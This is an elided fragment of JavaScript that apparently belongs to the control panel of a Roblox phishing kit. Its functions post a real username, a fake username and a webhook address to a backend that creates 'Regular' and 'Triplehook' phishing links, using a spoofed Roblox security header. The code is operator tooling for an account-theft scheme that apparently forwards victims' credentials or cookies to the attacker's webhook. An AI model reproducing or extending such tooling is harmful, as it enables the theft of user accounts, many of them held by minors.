function Hyperlink(a) {
    ...
    $.ajax({
        url: `/controlPage/apis/hyperlink?link=${encodeURIComponent(link)}`,
        dataType: 'json',
        headers: {
	...
	success: function(data){
	    document.querySelector("#Link").value = data["result"];
        }
...
function Regular(a, b, c){
    ...
    $.ajax({
        url: `/controlPage/apis/create?a=${encodeURIComponent(RealUsername)}&b=${encodeURIComponent(FakeUsername)}&c=${encodeURIComponent(Webhook)}&type=Regular${b}${c}`,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
...
function Triplehook(a) {
    var Directory = document.getElementById("DirectoryTriple").value;
    var Webhook = document.getElementById("WebhookTriple").value;

    $.ajax({
        url: `apis/create?a=${encodeURIComponent(Directory)}&b=${encodeURIComponent(Webhook)}&type=Triplehook`,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
